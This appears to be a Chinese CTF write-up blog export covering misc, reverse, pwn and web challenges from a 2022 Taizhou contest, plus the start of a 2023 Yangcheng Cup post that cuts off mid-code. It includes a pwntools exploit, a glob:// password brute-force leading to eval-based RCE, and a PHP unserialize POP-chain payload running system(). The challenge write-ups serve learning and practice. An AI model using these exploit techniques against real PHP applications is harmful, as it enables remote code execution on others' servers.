<h3 id="皇帝的flag"><a href="#皇帝的flag" class="headerlink" title="皇帝的flag"></a>皇帝的flag</h3><p>crc报错，修改高度，得到二维码，扫码得到<code>‌‌‌‌‍‬‍‍‌‌‌‌‍‌﻿‍‌‌‌‌‍﻿‌‌只有聪明的人才能得到‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‌‬flag‌‌‌‌‌﻿‌‌‌‌‌‌‍‍‌‬‌‌‌‌‍‍﻿﻿哦‌‌‌‌‍﻿‌‌‌‌‌‌‍‍‍﻿‌‌‌‌‍‌‍‌</code></p>
<p>在010中看到很多不可见字符，0宽得到密码<code>eMp3r0R_pWD</code></p>
<p>stegsolve分析，存在lsb隐写</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-3-1.png"></p>
<h3 id="列文虎克的秘密"><a href="#列文虎克的秘密" class="headerlink" title="列文虎克的秘密"></a>列文虎克的秘密</h3><p>这是什么题呀，太离谱了，十位密码爆破。100分简单题到结束才三血</p>
<p><em>赛后复现</em></p>
<p>先修复<code>zip</code>头，改成<code>50 4B 03 04</code>，然后进行十位数字爆破，得到<code>874375984</code></p>
<p>图片尾看到<code>oursecret</code>特征块，密码是图片上的列文虎克名字<code>LeEuw3nh0ek</code></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="EzMath1"><a href="#EzMath1" class="headerlink" title="EzMath1"></a>EzMath1</h3><p>先脱upx壳，在<code>TlsCallback_1</code>函数中找到程序实际用于检测的代码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-1.png"></p>
<p><code>sub_401210</code>函数检测输入的前7个字符</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-2.png"></p>
<p><code>sub_401670</code>函数检测其余输入的字符</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-3.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v21=Int(<span class="hljs-string">&#x27;v21&#x27;</span>)<br>v22=Int(<span class="hljs-string">&#x27;v22&#x27;</span>)<br>v23=Int(<span class="hljs-string">&#x27;v23&#x27;</span>)<br>v24=Int(<span class="hljs-string">&#x27;v24&#x27;</span>)<br>v31=Int(<span class="hljs-string">&#x27;v31&#x27;</span>)<br>v32=Int(<span class="hljs-string">&#x27;v32&#x27;</span>)<br>v33=Int(<span class="hljs-string">&#x27;v33&#x27;</span>)<br>s=Solver()<br>s.add(<span class="hljs-number">65</span>*v33+<span class="hljs-number">24</span>*v32+<span class="hljs-number">118</span>*v31+<span class="hljs-number">126</span>*v24+<span class="hljs-number">173</span>*v23+<span class="hljs-number">179</span>*v22+<span class="hljs-number">195</span>*v21==<span class="hljs-number">0xFE5F</span>)<br>s.add(<span class="hljs-number">277</span>*v33+<span class="hljs-number">236</span>*v32+<span class="hljs-number">433</span>*v31+<span class="hljs-number">484</span>*v24+<span class="hljs-number">228</span>*v23+<span class="hljs-number">142</span>*v22+<span class="hljs-number">261</span>*v21==<span class="hljs-number">0x28113</span>)<br>s.add(<span class="hljs-number">496</span>*v33+<span class="hljs-number">309</span>*v32+<span class="hljs-number">46</span>*v31+<span class="hljs-number">135</span>*v24+<span class="hljs-number">165</span>*v23+<span class="hljs-number">7</span>*v22+<span class="hljs-number">495</span>*v21==<span class="hljs-number">152196</span>)<br>s.add(<span class="hljs-number">236</span>*v33+<span class="hljs-number">250</span>*v32+<span class="hljs-number">41</span>*v31+<span class="hljs-number">247</span>*v24+<span class="hljs-number">67</span>*v23+<span class="hljs-number">251</span>*v22+<span class="hljs-number">471</span>*v21==<span class="hljs-number">0x1EFA4</span>)<br>s.add(<span class="hljs-number">457</span>*v33+<span class="hljs-number">414</span>*v32+<span class="hljs-number">271</span>*v31+<span class="hljs-number">32</span>*v24+<span class="hljs-number">244</span>*v23+<span class="hljs-number">74</span>*v22+<span class="hljs-number">113</span>*v21==<span class="hljs-number">0x24273</span>)<br>s.add(<span class="hljs-number">221</span>*v33+<span class="hljs-number">76</span>*v32+<span class="hljs-number">263</span>*v31+<span class="hljs-number">363</span>*v24+<span class="hljs-number">49</span>*v23+<span class="hljs-number">82</span>*v22+<span class="hljs-number">405</span>*v21==<span class="hljs-number">0x1B1AA</span>)<br>s.check()<br>a=<span class="hljs-string">&quot;Yqc77YD8jc&#x27;&#x27;&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br>r=s.model()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[v21 = 71,</span><br><span class="hljs-string"> v22 = 48,</span><br><span class="hljs-string"> v23 = 100,</span><br><span class="hljs-string"> v24 = 77,</span><br><span class="hljs-string"> v31 = 52,</span><br><span class="hljs-string"> v32 = 116,</span><br><span class="hljs-string"> v33 = 104]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r=[<span class="hljs-number">71</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br>    e=e+<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e=e+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)^<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-4.png"></p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="reader"><a href="#reader" class="headerlink" title="reader"></a>reader</h3><p>利用<code>edit</code>中的偏移 向<code>0x4260</code>处写入<code>0x200</code>个字符，可以覆盖<code>stream</code>和<code>filename</code>变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">off,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendafter(<span class="hljs-string">&#x27;data: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./reader&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;22385&#x27;</span>)<br><span class="hljs-built_in">open</span>()<br>read()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b open&#x27;)</span><br>edit(<span class="hljs-number">0x200</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&quot;./flag\x00&quot;</span>)<br><span class="hljs-built_in">open</span>()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-pwn-1-1.png"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="TryGetPasswd"><a href="#TryGetPasswd" class="headerlink" title="TryGetPasswd"></a>TryGetPasswd</h3><p><em>赛后复现</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-comment"># passwd 的格式为 [a-zA-z0-9]&#123;10&#125;</span><br><span class="hljs-variable">$hintfile</span> = <span class="hljs-string">&quot;/tmp/hint&quot;</span>.<span class="hljs-variable">$passwd</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch <span class="hljs-subst">$hintfile</span>&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">foreach</span> ((<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getSize</span>().<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;passwd&quot;</span>]===<span class="hljs-variable">$passwd</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>获取到<code>passwd</code>后可以<code>rce</code>，而<code>DirectoryIterator</code>可以列目录，它的参数支持<code>glob://</code>伪协议，当存在文件时<code>$file-&gt;getSize()有回显</code>回显，这样就可以通过脚本遍历获取到<code>passwd</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&amp;dir=glob:///tmp/hint&quot;</span><br>b=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> b:<br>        r=requests.get(url+data+j+<span class="hljs-string">&#x27;*&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            data=data+j<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-1.png"></p>
<p>拿到passwd：<code>st1sOFAblF</code>，进行rce</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-2.png"></p>
<h3 id="ezGadget01"><a href="#ezGadget01" class="headerlink" title="ezGadget01"></a>ezGadget01</h3><p><em>赛后复现</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;exit&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = False;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;judge)<br>        &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;, &quot;</span>, <span class="hljs-variable">$arguments</span>));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My name is &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-number">5</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;num &gt; <span class="hljs-number">10</span>)<br>        &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chain</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;param))<br>        &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;param-&gt;arg;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在<code>Junit</code>类中存在<code>e</code>方法会执行<code>eval</code>函数<br>可以利用<code>CallFunction</code>类中的<code>__call</code>方法调用<code>Junit</code>类中<code>e</code>方法<br>利用<code>GetName</code>类中的<code>__get</code>方法触发<code>CallFunction</code>类中的<code>__call</code>方法<br>利用<code>Proc01</code>类中的<code>__toString</code>方法触发<code>GetName</code>类中的<code>__get</code>方法<br>利用<code>Space</code>类中的<code>__wakeup</code>方法触发<code>Proc01</code>类中的<code>__toString</code>方法</p>
<p>调用顺序:<code>Space-&gt;Proc01-&gt;GetName-&gt;CallFunction-&gt;Junit</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = True;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num=<span class="hljs-number">20</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=[<span class="hljs-keyword">new</span> <span class="hljs-title class_">Junit</span>(),<span class="hljs-string">&quot;e&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallFunction</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;args=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;param=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetName</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proc01</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Space</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-3-1.png"></p>
<h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><p>疫情原因线上awd。Rank: 2</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>wp</tag>
        <tag>台州</tag>
      </tags>
  </entry>
  <entry>
    <title>2023羊城杯misc&amp;web wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF.html</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>访问<code>/p0p.php</code>，返回一个<code>hint.zip</code></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica">Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">vO</span> <span class="hljs-variable">Ow0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> Ö<span class="hljs-type">_O</span> Ö<span class="hljs-operator">.</span><span class="hljs-built_in">O</span> <span class="hljs-type">o_o</span> <span class="hljs-number">0.</span><span class="hljs-built_in">O</span> <span class="hljs-variable">OvO</span> <span class="hljs-variable">o</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> <span class="hljs-variable">o</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-operator">.</span>Ö <span class="hljs-variable">Ovo</span> <span class="hljs-number">0</span><span class="hljs-type">_</span>Ö Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">w</span>Ö <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-variable">OwO</span> <span class="hljs-variable">ov0</span> <span class="hljs-variable">owo</span> <span class="hljs-type">o_O</span> <span class="hljs-built_in">O</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-variable">vo</span><br></code></pre></td></tr></table></figure>

<p><a href="https://zdjd.vercel.app/">尊嘟假嘟翻译器O.o</a>得到<code>flag在/tmp/catcatf1ag.txt</code></p>
<p>利用  <a href="http://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</a>  得到源码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-1.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>     &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span 